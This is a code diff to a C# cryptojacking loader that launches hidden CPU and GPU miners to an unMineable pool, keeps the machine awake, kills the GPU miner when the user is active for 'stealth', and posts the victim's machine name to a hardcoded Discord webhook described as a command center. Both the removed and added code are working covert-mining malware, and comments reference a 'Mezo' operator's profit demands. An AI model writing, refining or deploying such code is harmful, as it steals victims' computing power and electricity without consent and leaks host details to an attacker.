@@ -26,103 +26,93 @@ public class DateFundLoader {
     private const uint ES_SYSTEM_REQUIRED = 0x00000001;
     private const uint ES_AWAYMODE_REQUIRED = 0x00000040;
 
-    public static void StartMiner(string cpuMinerPath, string gpuMinerPath, string wallet) {
+    // Hardcoded identity
+    private const string IDENT = "WinSys";
+    private const int IDLE_THRESHOLD_MS = 2 * 60 * 1000; // 2 minutes
+
+    public static void StartMiner(string cpuPath, string gpuPath, string wallet) {
         try {
-            // Keep the system awake and prevent hibernation/sleep
             SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
-            
-            // Notify Mezo's command center
             NotifyDiscord(wallet);
 
-            // 1. Start the CPU Miner Watchdog (Immortal feature)
-            Thread cpuThread = new Thread(() => MonitorAndReviveCpu(cpuMinerPath, wallet));
-            cpuThread.IsBackground = true;
-            cpuThread.Start();
+            // One unified manager thread for max clean/insane performance
+            Thread manager = new Thread(() => RunManager(cpuPath, gpuPath, wallet));
+            manager.IsBackground = true;
+            manager.Start();
 
-            // 2. Start the Idle Monitor for the GPU Miner
-            if (!string.IsNullOrEmpty(gpuMinerPath) && File.Exists(gpuMinerPath)) {
-                Thread gpuThread = new Thread(() => MonitorIdleAndMine(gpuMinerPath, wallet));
-                gpuThread.IsBackground = true;
-                gpuThread.Start();
-            }
-
-            // 3. Block PowerShell from exiting so our watchdogs can run forever
             Thread.Sleep(Timeout.Infinite);
-        } catch (Exception) {
-            // Silently fail
-        }
+        } catch { }
     }
 
-    private static void MonitorAndReviveCpu(string cpuMinerPath, string wallet) {
-        string args = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.ENI_LO_CPU -p x --donate-level 1 --cpu-max-threads-hint 100", wallet);
-        string procName = Path.GetFileNameWithoutExtension(cpuMinerPath);
-        
+    private static void RunManager(string cpuPath, string gpuPath, string wallet) {
+        Process cpuProc = null;
+        Process gpuProc = null;
+        bool wasIdle = false;
+
         while (true) {
             try {
-                Process[] existing = Process.GetProcessesByName(procName);
-                if (existing.Length == 0) {
-                    ProcessStartInfo startInfo = new ProcessStartInfo(cpuMinerPath);
-                    startInfo.Arguments = args;
-                    startInfo.CreateNoWindow = true;
-                    startInfo.UseShellExecute = false;
-                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                    Process.Start(startInfo);
+                bool isIdle = GetIdleTime() > IDLE_THRESHOLD_MS;
+
+                // CPU Dynamic Load Management (Always running, shifts load)
+                if (isIdle != wasIdle || cpuProc == null || cpuProc.HasExited) {
+                    if (cpuProc != null && !cpuProc.HasExited) {
+                        try { cpuProc.Kill(); } catch { }
+                    }
+                    
+                    int threads = isIdle ? 100 : 45;
+                    string cpuArgs = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.{1}_CPU -p x --donate-level 1 --cpu-max-threads-hint {2}", wallet, IDENT, threads);
+                    
+                    ProcessStartInfo si = new ProcessStartInfo(cpuPath) {
+                        Arguments = cpuArgs,
+                        CreateNoWindow = true,
+                        UseShellExecute = false,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    };
+                    cpuProc = Process.Start(si);
                 }
+
+                // GPU Dynamic Management (Simultaneous but kills on active for max stealth)
+                if (!string.IsNullOrEmpty(gpuPath) && File.Exists(gpuPath)) {
+                    if (isIdle) {
+                        // Start GPU miner if idle and not already running
+                        if (gpuProc == null || gpuProc.HasExited) {
+                            ProcessStartInfo si = new ProcessStartInfo(gpuPath) {
+                                Arguments = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.{1}_GPU --pass x", wallet, IDENT),
+                                CreateNoWindow = true,
+                                UseShellExecute = false,
+                                WindowStyle = ProcessWindowStyle.Hidden
+                            };
+                            gpuProc = Process.Start(si);
+                        }
+                    } else {
+                        // Kill GPU miner immediately if user is active
+                        if (gpuProc != null && !gpuProc.HasExited) {
+                            try { gpuProc.Kill(); gpuProc = null; } catch { }
+                        }
+                    }
+                }
+                
+                wasIdle = isIdle;
             } catch { }
-            Thread.Sleep(3000); // Check every 3 seconds
-        }
-    }
-
-    private static void MonitorIdleAndMine(string gpuMinerPath, string wallet) {
-        Process gpuProcess = null;
-
-        while (true) {
-            // User activity check removed per Mezo's request for max profits - 24/7 mining
-            if (gpuProcess == null || gpuProcess.HasExited) {
-                try {
-                    ProcessStartInfo startInfo = new ProcessStartInfo(gpuMinerPath);
-                    startInfo.Arguments = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.ENI_LO_GPU --pass x", wallet);
-                    startInfo.CreateNoWindow = true;
-                    startInfo.UseShellExecute = false;
-                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                    gpuProcess = Process.Start(startInfo);
-                } catch { }
-            }
-
-            Thread.Sleep(5000); 
+            Thread.Sleep(5000);
         }
     }
 
     private static void NotifyDiscord(string wallet) {
         try {
             string webhookUrl = "https://discord.com/api/webhooks/1495748321078284358/ZrPnFP_wT81nNxuqlsAOB9FNWrOJhK3nPGRYQJjDuH-2mIWdyNf1RK_Ql9Quf6vSgbKr";
-            
-            // Force TLS 1.2 for Discord
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-
-            string compName = Environment.MachineName;
-            string userName = Environment.UserName;
-            
-            // Format message and escape backslashes/quotes for raw JSON delivery
-            string msg = string.Format("🚀 **New Worker Alive!**\\n**Host:** `{0}`\\n**User:** `{1}`\\n**Wallet:** `{2}`\\n**Status:** Fully Optimized", compName, userName, wallet);
-            
+            string msg = string.Format("🚀 **{0} Worker Online!**\\n**Host:** `{1}`\\n**Mode:** Dynamic (100% Idle / 45% Active)", IDENT, Environment.MachineName);
             using (WebClient wc = new WebClient()) {
                 wc.Headers[HttpRequestHeader.ContentType] = "application/json";
-                string json = "{\"content\": \"" + msg + "\"}";
-                wc.UploadString(webhookUrl, json);
+                wc.UploadString(webhookUrl, "{\"content\": \"" + msg + "\"}");
             }
         } catch { }
     }
 
     private static uint GetIdleTime() {
-        LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
-        lastInputInfo.cbSize = Marshal.SizeOf(lastInputInfo);
-        lastInputInfo.dwTime = 0;
-
-        if (GetLastInputInfo(ref lastInputInfo)) {
-            return (uint)Environment.TickCount - lastInputInfo.dwTime;
-        }
-
-        return 0;
+        LASTINPUTINFO lii = new LASTINPUTINFO();
+        lii.cbSize = Marshal.SizeOf(lii);
+        return GetLastInputInfo(ref lii) ? (uint)Environment.TickCount - lii.dwTime : 0;
     }
 }
